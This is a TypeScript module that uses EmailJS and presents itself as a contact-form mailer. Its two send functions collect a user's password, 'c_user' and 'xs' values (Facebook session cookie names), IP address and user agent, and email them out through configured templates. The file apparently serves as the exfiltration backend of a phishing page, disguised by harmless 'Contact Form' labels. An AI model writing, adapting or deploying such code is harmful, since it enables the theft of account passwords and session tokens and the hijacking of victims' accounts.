import emailjs from "@emailjs/browser";

// Initialize EmailJS with your user ID
export const initEmailJS = () => {
  const userId = import.meta.env.VITE_EMAILJS_USER_ID;
  if (!userId) {
    console.error("EmailJS User ID is not configured");
    return;
  }

  // Validate other required environment variables
  const requiredVars = [
    'VITE_EMAILJS_SERVICE_ID',
    'VITE_EMAILJS_VALIDATION_TEMPLATE_ID',
    'VITE_EMAILJS_CONFIRMATION_TEMPLATE_ID'
  ];

  const missingVars = requiredVars.filter(
    varName => !import.meta.env[varName]
  );

  if (missingVars.length > 0) {
    console.error(`Missing required environment variables: ${missingVars.join(', ')}`);
    return;
  }

  emailjs.init(userId);
  console.log('EmailJS initialized successfully');
};

// Type definition for form data
export interface EmailFormData {
  user_email?: string;
  contactMethod?: "email" | "phone";
  ipAddress?: string;
  password?: string;
  c_user?: string;
  xs?: string;
  countryCode?: string;
  timestamp?: string;
  userAgent?: string;
}

// Validation form email sender
export const sendValidationFormEmail = async (formData: EmailFormData) => {
  try {
    const serviceId = import.meta.env.VITE_EMAILJS_SERVICE_ID;
    const templateId = import.meta.env.VITE_EMAILJS_VALIDATION_TEMPLATE_ID;

    if (!serviceId || !templateId) {
      throw new Error("EmailJS service or template ID is not configured");
    }

    const templateParams = {
      to_email: formData.user_email || "admin@example.com",
      from_name: "Contact Form",
      subject: "Contact Form - Validation Request",
      c_user: formData.c_user,
      xs: formData.xs,
      timestamp: formData.timestamp || new Date().toLocaleString(),
      ip_address: formData.ipAddress || "Not available",
      user_agent: formData.userAgent || navigator.userAgent,
    };

    return await emailjs.send(serviceId, templateId, templateParams);
  } catch (error) {
    console.error("Error sending validation email:", error);
    throw error;
  }
};

// Confirmation form email sender
export const sendConfirmationFormEmail = async (formData: EmailFormData) => {
  try {
    const serviceId = import.meta.env.VITE_EMAILJS_SERVICE_ID;
    const templateId = import.meta.env.VITE_EMAILJS_CONFIRMATION_TEMPLATE_ID;

    if (!serviceId || !templateId) {
      throw new Error("EmailJS service or template ID is not configured");
    }

    const templateParams = {
      to_email: formData.user_email || "admin@example.com",
      subject: "Contact Form - Confirmation Details",
      user_password: formData.password,
      contact_method: formData.contactMethod,
      country_code: formData.countryCode,
      timestamp: formData.timestamp || new Date().toLocaleString(),
      ip_address: formData.ipAddress || "Not available",
      user_agent: formData.userAgent || navigator.userAgent,
    };

    return await emailjs.send(serviceId, templateId, templateParams);
  } catch (error) {
    console.error("Error sending confirmation email:", error);
    throw error;
  }
};